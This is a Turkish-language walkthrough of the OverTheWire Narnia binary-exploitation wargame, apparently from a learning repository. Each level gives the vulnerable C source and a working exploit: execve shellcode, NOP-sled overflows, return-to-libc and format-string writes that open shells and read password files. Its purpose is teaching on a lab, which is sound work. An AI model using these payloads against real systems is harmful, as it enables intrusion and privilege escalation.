# 💥 OverTheWire: Narnia — Level 0'dan Level 8'e Türkçe Rehber

> Narnia, **binary exploitation**'a (ikili dosya istismarı) giriş yapılan ilk wargame.  
> Her level gerçek bir C programı — kaynak kodu veriliyor ama açığı bulmak ve  
> exploit yazmak sana kalıyor. Assembly okuma ve GDB zorunlu, sabır daha da zorunlu.

**Platform:** `narnia.labs.overthewire.org` | **Port:** `2226`  
**Başlangıç:** kullanıcı `narnia0`, şifre `narnia0`  
**Dosyalar:** `/narnia/` klasöründe  
**Referans:** [cplusperks.com](https://cplusperks.com/narnia/) · [hackmd.io](https://hackmd.io/@Chivato/B112H_I18) · [tuonilabs.wordpress.com](https://tuonilabs.wordpress.com/2017/05/13/overthewire-narnia-write-up/)

---

## ⚠️ Ön Koşullar

Narnia'ya başlamadan önce şunları bilmen gerekiyor:

| Konu | Neden gerekli |
|---|---|
| x86 Assembly temelleri | GDB çıktısını okumak için |
| C programlama temelleri | Kaynak kodu anlamak için |
| GDB kullanımı | Stack'i incelemek için |
| Little-endian byte sırası | Adresleri doğru yazmak için |
| Stack yapısı (EBP, ESP, EIP) | Overflow nereye gidiyor? |

Hazır değilsen önce şu kaynakları oku:
- [x86 Assembly — NASM Tutorial](https://cs.lmu.edu/~ray/notes/nasmtutorial/)
- [GDB Quick Reference](https://users.ece.utexas.edu/~adnan/gdb-refcard.pdf)
- [Buffer Overflow — LiveOverflow](https://www.youtube.com/watch?v=T03idxny9jE)

---

## 🗺️ Genel Bakış

| Level | Açık | Teknik |
|---|---|---|
| 0 → 1 | Stack buffer overflow (değişken üzerine yaz) | `scanf` → `val` üzerine yaz |
| 1 → 2 | Environment variable shellcode | `EGG` değişkenine shellcode koy |
| 2 → 3 | Stack buffer overflow (EIP kontrolü) | `strcpy` + NOP sled + shellcode |
| 3 → 4 | Buffer overflow + sembolik link | `ofile` üzerine yaz, symlink ile şifreyi kopyalat |
| 4 → 5 | Stack buffer overflow (env temizlenmiş) | NOP sled + shellcode, ortam değişkeni yok |
| 5 → 6 | Format string saldırısı | `%n` ile değişken üzerine yaz |
| 6 → 7 | Return-to-libc + fonksiyon pointer | `fp` üzerine `system()` adresi yaz |
| 7 → 8 | Format string → fonksiyon pointer | `ptrf`'i `hackedfunction`'a yönlendir |
| 8 → 9 | `blah` pointer manipülasyonu + env shellcode | Pointer'ı düzelt, ret adresini ele geçir |

---

## Level 0 → Level 1 — Stack Buffer Overflow (Değişken Üzerine Yazma)

### 🔐 Bağlantı
```bash
ssh narnia0@narnia.labs.overthewire.org -p 2226
# Şifre: narnia0
```

### 🎯 Görev
`val` değişkenini `0x41414141`'den `0xdeadbeef`'e değiştir → shell al.

### 📖 Kaynak Kod
```c
int main(){
    long val = 0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    scanf("%24s", &buf);      // 24 byte okuyor ama buf sadece 20!

    if(val == 0xdeadbeef)
        system("/bin/sh");
    else
        printf("WAY OFF!!!!\n");
}
```

### 📖 Teori: Stack Layout ve Buffer Overflow

Stack'te değişkenler sırayla yerleşir:
```
Düşük adres  →  [buf: 20 byte][val: 4 byte]  →  Yüksek adres
```

`scanf("%24s")` 24 byte okur ama `buf` sadece 20 byte. Fazla byte'lar `val`'in üzerine yazar!

**Little-endian:** x86 sistemlerde çok byte'lı değerler ters sırada saklanır.  
`0xdeadbeef` → `\xef\xbe\xad\xde` olarak yazılır.

### 🔧 Çözüm

```bash
narnia0@narnia:/narnia$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
buf: AAAAAAAAAAAAAAAAAAAA
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
<şifre buraya gelir>
```

> 💡 **`; cat` neden?** Shell açılıp hemen kapanmasın diye. `cat` stdin'i açık tutar, komut girebilirsin.

> 💡 **Little-endian:** `0xdeadbeef` → bellekte `ef be ad de` sıralamasıyla yazılır.

---

## Level 1 → Level 2 — Environment Variable Shellcode

### 🔐 Bağlantı
```bash
ssh narnia1@narnia.labs.overthewire.org -p 2226
```

### 🎯 Görev
`EGG` environment variable'ına shellcode koy, binary onu çalıştırır.

### 📖 Kaynak Kod
```c
int main(){
    int (*ret)();

    if(getenv("EGG") == NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    ret = getenv("EGG");   // EGG'in adresini fonksiyon pointer'a ata
    ret();                 // O adresi çalıştır!
}
```

### 📖 Teori: Shellcode ve Environment Variable

**Shellcode:** `/bin/sh` açan makine kodu. Assembly'de yazılıp hex byte'lara dönüştürülür.

Klasik x86 Linux shellcode (25 byte):
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80
```
Bu `execve("/bin//sh", ["/bin//sh"], NULL)` yapar → shell açar.

### 🔧 Çözüm

```bash
# EGG değişkenine shellcode yaz
narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')

# Çalıştır
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
<şifre buraya gelir>
```

> 💡 **Shell-storm.org** — farklı mimari ve OS için hazır shellcode'lar bulabileceğin site.

---

## Level 2 → Level 3 — EIP Kontrolü + NOP Sled

### 🔐 Bağlantı
```bash
ssh narnia2@narnia.labs.overthewire.org -p 2226
```

### 🎯 Görev
`EIP` register'ını ele geçir, shellcode'a yönlendir.

### 📖 Kaynak Kod
```c
int main(int argc, char *argv[]){
    char buf[128];

    if(argc == 1){ printf("Usage: %s argument\n", argv[0]); exit(1); }
    strcpy(buf, argv[1]);   // Boyut kontrolü yok!
    printf("%s", buf);
}
```

### 📖 Teori: EIP Kontrolü ve NOP Sled

**EIP (Extended Instruction Pointer):** Bir sonraki çalıştırılacak komutun adresi. Fonksiyon çağrısında stack'e kaydedilir.

Stack yapısı:
```
[buf: 128 byte][...][saved EBP: 4 byte][return addr (EIP): 4 byte]
```

128 byte buffer'ı taşırıp return address'e shellcode'umuzun adresini yazarsak → fonksiyon dönünce shellcode çalışır!

**NOP Sled (`\x90`):** "No Operation" byte'ı. CPU atlayıp geçer. Shellcode'dan önce çok sayıda `\x90` koyarsak, tam adres bilmeden da shellcode'a ulaşabiliriz.

```
[NOPs ... NOPs][SHELLCODE][RETURN_ADDR]
      ↑
      Buraya atlarsan shellcode'a kayarsın
```

### 🔧 Çözüm

```bash
# Önce offset'i bul: 140 byte doldurunca EIP'e ulaşıyoruz
narnia2@narnia:/narnia$ gdb -q narnia2
(gdb) r $(python -c 'print "A"*144')
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()   # EIP = 0x41414141 → offset = 140

# Buffer'ın stack adresini bul
(gdb) r $(python -c 'print "A"*140')
(gdb) x/20wx $esp
...
0xffffd830: 0x41414141 ...  # Buffer başlangıcı

# NOP sled + shellcode + return address
narnia2@narnia:/narnia$ ./narnia2 $(python -c 'print "\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xd8\xff\xff"')
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
<şifre buraya gelir>
```

> ⚠️ Stack adresi her ortamda farklı olabilir. GDB'de `x/20wx $esp` ile buffer'ın adresini kendin bul, NOP sled'in ortasına bir adres seç.

---

## Level 3 → Level 4 — Buffer Overflow + ofile Manipülasyonu

### 🔐 Bağlantı
```bash
ssh narnia3@narnia.labs.overthewire.org -p 2226
```

### 🎯 Görev
Dosya kopyalama programı. `ofile`'ı hedef şifre dosyasına yönlendir.

### 📖 Kaynak Kod
```c
int main(int argc, char **argv){
    int ifd, ofd;
    char ofile[16] = "/dev/null";  // Çıktı: /dev/null
    char ifile[32];                // Girdi: argv[1]
    char buf[32];

    strcpy(ifile, argv[1]);        // ifile'a kopyala — kontrol yok!
    ofd = open(ofile, O_RDWR);     // ofile'ı aç
    ifd = open(ifile, O_RDONLY);   // ifile'ı aç
    read(ifd, buf, sizeof(buf)-1);
    write(ofd, buf, sizeof(buf)-1);// ifile'ı ofile'a yaz
}
```

Stack'te sıralama: `[ifile: 32 byte][ofile: 16 byte]`  
`ifile`'ı 32 byte'dan fazla doldurursan `ofile`'ın üzerine yazarsın!

### 🔧 Çözüm

```bash
narnia3@narnia:/narnia$ mkdir /tmp/ex3 && cd /tmp/ex3

# 32 karakterlik bir yol oluştur: /tmp/ex3/AAAAAAAAAAAAAAAAAAAAAA/ = 32 char
narnia3@narnia:/tmp/ex3$ mkdir $(python -c 'print "A"*22')
narnia3@narnia:/tmp/ex3$ ln -s /etc/narnia_pass/narnia4 /tmp/ex3/$(python -c 'print "A"*22')/readthis

# Yazılacak output dosyasını oluştur
narnia3@narnia:/tmp/ex3$ touch readthis && chmod 777 readthis

# Çalıştır: ifile = 32 char yol → ofile = "readthis" olur
narnia3@narnia:/tmp/ex3$ /narnia/narnia3 /tmp/ex3/$(python -c 'print "A"*22')/readthis

narnia3@narnia:/tmp/ex3$ cat readthis
<şifre buraya gelir>
```

---

## Level 4 → Level 5 — Ortam Temizlenmiş Overflow

### 🔐 Bağlantı
```bash
ssh narnia4@narnia.labs.overthewire.org -p 2226
```

### 🎯 Görev
Level 2 ile aynı ama bu sefer ortam değişkenleri (`environ`) sıfırlanıyor. Shellcode'u buffer'ın içine koy.

### 📖 Kaynak Kod
```c
extern char **environ;
int main(int argc, char **argv){
    int i;
    char buffer[256];

    for(i=0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));  // Ortam değişkenlerini sil!

    if(argc > 1)
        strcpy(buffer, argv[1]);  // Boyut kontrolü yok
}
```

Environ silindi → shellcode'u environment variable'a koyamayız. Ama buffer 256 byte — shellcode için fazlasıyla yeterli!

### 🔧 Çözüm

```bash
# Offset = 264 (256 buffer + 4 EBP + 4 EIP öncesi dolgu)
# Shellcode = 25 byte, kalan = 231 byte NOP
narnia4@narnia:/narnia$ gdb -q narnia4
(gdb) r $(python -c 'print "A"*264')
# SIGSEGV → 0x41414141 → offset doğru

# Buffer adresini bul
(gdb) r $(python -c 'print "A"*260')
(gdb) x/40wx $esp
# Buffer adresini not al: örn. 0xffffd4d4

# NOP sled + shellcode + return address
narnia4@narnia:/narnia$ ./narnia4 $(python -c 'print "\x90"*231 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "BBBB" + "\xd4\xd4\xff\xff"')
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
<şifre buraya gelir>
```

---

## Level 5 → Level 6 — Format String Saldırısı

### 🔐 Bağlantı
```bash
ssh narnia5@narnia.labs.overthewire.org -p 2226
```

### 🎯 Görev
`i` değişkenini 1'den 500'e değiştir. Buffer overflow yok — format string açığı var.

### 📖 Kaynak Kod
```c
int main(int argc, char **argv){
    int i = 1;
    char buffer[64];

    snprintf(buffer, sizeof buffer, argv[1]);  // FORMAT STRING AÇIĞI!
    if(i == 500){
        system("/bin/sh");
    }
    printf("i = %d (%p)\n", i, &i);  // i'nin adresini veriyor!
}
```

### 📖 Teori: Format String Açığı

`printf("%s", input)` güvenli, ama `printf(input)` tehlikeli!

Format string `%n` → o ana kadar yazdırılan byte sayısını belirtilen adrese yazar:
```
"\xADDR%496x%5$n"
→ Adres 4 byte, sonra 496 boşluk = toplam 500 byte
→ %5$n → stack'teki 5. argümanın adresine 500 yazar
```

### 🔧 Çözüm

```bash
# 1. Programı çalıştır, i'nin adresini öğren
narnia5@narnia:/narnia$ ./narnia5 AAAA
i = 1 (0xffffd6cc)   # i'nin adresi

# 2. Stack'teki offset'i bul (buffer kaçıncı argüman?)
narnia5@narnia:/narnia$ ./narnia5 AAAA%x.%x.%x.%x.%x
# 5. %x'te 41414141 görünce → offset = 5

# 3. i'nin adresini + %496x + %5$n ile 500 yaz
narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print "\xcc\xd6\xff\xff"')%.496x%5\$n
Change i's value from 1 -> 500. GOOD
$ cat /etc/narnia_pass/narnia6
<şifre buraya gelir>
```

> ⚠️ `i`'nin adresi her çalışmada değişebilir. Program çıktısındaki `(%p)` değerini kullan.

---

## Level 6 → Level 7 — Return-to-libc + Fonksiyon Pointer

### 🔐 Bağlantı
```bash
ssh narnia6@narnia.labs.overthewire.org -p 2226
```

### 🎯 Görev
`fp` fonksiyon pointer'ını `puts`'tan `system`'e yönlendir, `b1`'i `/bin/sh` yap.

### 📖 Kaynak Kod
```c
int main(int argc, char *argv[]){
    char b1[8], b2[8];
    int (*fp)(char *) = (int(*)(char *))&puts;   // fp → puts

    strcpy(b1, argv[1]);   // b1'e kopyala
    strcpy(b2, argv[2]);   // b2'ye kopyala

    fp(b1);   // fp(b1) → aslında puts(b1) ama fp'yi değiştirebiliriz!
}
```

Stack sıralaması: `[b2][b1][fp]` — b1'i taşırınca fp'ye ulaşırsın!

### 📖 Teori: Return-to-libc

Shellcode yerine zaten bellekte olan `system()` fonksiyonunu çağırırız. Environ sıfırlanmış olsa da libc her zaman bellekte!

```bash
(gdb) p system
$1 = {<text variable>} 0xf7e62cd0 <system>
```

### 🔧 Çözüm

```bash
narnia6@narnia:/narnia$ gdb -q narnia6
(gdb) p system
$1 = 0xf7e62cd0   # system'in adresi

# b1 = 8 byte doldur + system adresi → fp'yi ele geçir
# b2 = 8 byte doldur + /bin/sh → b1 üzerinden geç

narnia6@narnia:/narnia$ ./narnia6 \
  $(python -c 'print "A"*8 + "\xd0\x2c\xe6\xf7"') \
  $(python -c 'print "B"*8 + "/bin/sh"')
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
<şifre buraya gelir>
```

> ⚠️ `system()` adresi sisteme göre değişir, GDB ile kendin bul.

---

## Level 7 → Level 8 — Format String → Fonksiyon Pointer

### 🔐 Bağlantı
```bash
ssh narnia7@narnia.labs.overthewire.org -p 2226
```

### 🎯 Görev
`ptrf` pointer'ını `goodfunction`'dan `hackedfunction`'a değiştir.

### 📖 Kaynak Kod
```c
int vuln(const char *format){
    char buffer[128];
    int (*ptrf)();

    ptrf = goodfunction;
    snprintf(buffer, sizeof buffer, format);  // Format string açığı!
    return ptrf();   // hackedfunction'a yönlendirmemiz gerekiyor
}

int hackedfunction(){
    system("/bin/sh");   // Hedef bu!
}
```

### 🔧 Çözüm

```bash
# Adresler programı çalıştırınca verilir
narnia7@narnia:/narnia$ ./narnia7 test
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706
before : ptrf() = 0x80486e0 (0xffffd61c)   # ptrf'nin adresi

# hackedfunction = 0x8048706
# HOB = 0x0804, LOB = 0x8706
# Offset = 6 (ltrace ile doğrula)
# 0x8706 = 34566 decimal, 34566 - 8 (addr bytes) = 34558

narnia7@narnia:/narnia$ ./narnia7 $(python -c 'print "\x1c\xd6\xff\xff\x1e\xd6\xff\xff"')%.2044x%6\$hn%.32514x%7\$hn
Way to go!!!!
$ cat /etc/narnia_pass/narnia8
<şifre buraya gelir>
```

> 💡 `%hn` → 2 byte (short) yazar. `%n` → 4 byte yazar. Adres iki parçada yazılır: düşük 2 byte, yüksek 2 byte.

---

## Level 8 → Level 9 — Pointer Manipülasyonu + Env Shellcode

### 🔐 Bağlantı
```bash
ssh narnia8@narnia.labs.overthewire.org -p 2226
```

### 🎯 Görev
`blah` pointer'ı kendi kendini koruyan bir döngü var. Pointer'ı düzelterek overflow yap, return adresini shellcode'a yönlendir.

### 📖 Kaynak Kod
```c
void func(char *b){
    char *blah = b;     // blah = b'nin adresi
    char bok[20];

    memset(bok, '\0', sizeof(bok));
    for(i=0; blah[i] != '\0'; i++)
        bok[i] = blah[i];   // blah'dan bok'a kopyala
}
```

**Neden normal overflow çalışmıyor?** `bok[20]`'yi taşırınca `blah` pointer'ını eziyorsun. `blah` artık kendi input string'ini göstermiyor — döngü beklenmedik bir yerde bitiyor!

**Çözüm:** 20 byte `bok`'u doldur, sonra `blah`'ı orijinal `b`'nin adresine geri yaz, sonra devam et ve return address'i shellcode'a yönlendir.

### 🔧 Çözüm

```bash
# 1. Shellcode'u environment variable'a koy
narnia8@narnia:/narnia$ export PERKS=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')

# 2. getenvaddr programıyla PERKS'in adresini bul
# (Bu programı /tmp/getenvaddr.c olarak derliyorsun)
cat > /tmp/getenvaddr.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char *argv[]) {
    char *ptr = getenv(argv[1]);
    if (!ptr) { printf("Not found\n"); return 1; }
    if (argc == 3) ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;
    printf("%s will be at %p\n", argv[1], ptr);
    return 0;
}
EOF
gcc -m32 /tmp/getenvaddr.c -o /tmp/getenvaddr

# 3. PERKS adresini bul (binary ile aynı isimde çağır)
narnia8@narnia:/narnia$ /tmp/getenvaddr PERKS ./narnia8
PERKS will be at 0xffffdf66

# 4. GDB ile blah ve return address offsetlerini bul
# offset: 20 byte bok + blah düzeltme + 12 byte + return addr = 36 byte

# 5. Exploit
narnia8@narnia:/narnia$ ./narnia8 $(python -c 'print "A"*20 + "\x85\xdf\xff\xff" + "A"*12 + "\x66\xdf\xff\xff"')
$ whoami
narnia9
$ cat /etc/narnia_pass/narnia9
<şifre buraya gelir>
```

---

## 🏁 Tebrikler — Narnia Tamamlandı!

```bash
ssh narnia9@narnia.labs.overthewire.org -p 2226
narnia9@narnia:~$ cat CONGRATULATIONS
you are l33t! next plz...
```

---

## 📚 Öğrenilen Binary Exploitation Kavramları

| Kavram | Açıklama |
|---|---|
| **Buffer Overflow** | Buffer'ı taşırıp bitişik belleği ezmek |
| **EIP Kontrolü** | Return address üzerine yazarak kod akışını yönlendirme |
| **NOP Sled (`\x90`)** | Shellcode'a "kaymak" için dolgu |
| **Shellcode** | `/bin/sh` açan küçük makine kodu |
| **Little-endian** | Adresleri ters sırada yazmak: `0xdeadbeef` → `\xef\xbe\xad\xde` |
| **Return-to-libc** | Shellcode yerine mevcut kütüphane fonksiyonunu çağırma |
| **Format String** | `%n` ile belleğe yazma, `%x` ile okuma |
| **Fonksiyon Pointer** | Overflow ile fonksiyon adresini değiştirme |
| **Environment Shellcode** | Shellcode'u env variable'da saklama |

## 📚 Kullanılan GDB Komutları

```
gdb -q binary            → GDB başlat
r argüman                → Çalıştır
b *func+OFFSET           → Breakpoint koy
x/20wx $esp              → Stack'i hex göster
x/s $adres               → Adresteki string'i göster
p system                 → system() adresini bul
info registers           → Register değerlerini göster
disas main               → Assembly kodunu göster
set disassembly-flavor intel  → Intel syntax kullan
```

---

## 🔗 Faydalı Kaynaklar

- [OverTheWire Narnia](https://overthewire.org/wargames/narnia/)
- [cplusperks.com Narnia Full Writeup](https://cplusperks.com/narnia/) (tüm level'lar)
- [HackMD Narnia 0-4](https://hackmd.io/@Chivato/B112H_I18)
- [TuoniLabs Narnia Writeup](https://tuonilabs.wordpress.com/2017/05/13/overthewire-narnia-write-up/)
- [LiveOverflow — Binary Exploitation](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
- [Shell-storm.org Shellcodes](http://shell-storm.org/shellcode/)
- [GDB Quick Reference](https://users.ece.utexas.edu/~adnan/gdb-refcard.pdf)
- [Format String Exploits — CodeArcana](http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html)

---

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
